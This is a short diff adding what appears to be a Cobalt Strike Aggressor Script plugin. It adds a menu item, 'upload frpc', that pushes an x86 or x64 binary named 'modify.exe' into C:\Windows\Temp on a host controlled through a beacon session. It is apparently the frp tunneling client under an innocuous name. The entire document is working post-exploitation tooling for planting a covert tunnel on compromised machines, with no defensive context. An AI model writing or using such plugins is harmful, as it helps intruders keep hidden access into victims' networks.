@@ -1,0 +1,21 @@
+#########
+ Test
+#########
+
+item "上传frpc" {
+    $bid = $1;
+    $dialog = dialog("上传frpc", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &FRP);
+    drow_text($dialog, "UploadPath",  "上传路径: ");    
+    dbutton_action($dialog, "上传");
+    dialog_show($dialog);
+}
+sub FRP {
+
+    bcd($bid, $3['UploadPath']);
+    if (-is64 $bid['id']) {
+        bupload($bid, script_resource("/script/x64/modify.exe"));
+    }else{
+        bupload($bid, script_resource("/script/x86/modify.exe"));
+    }
+
+}
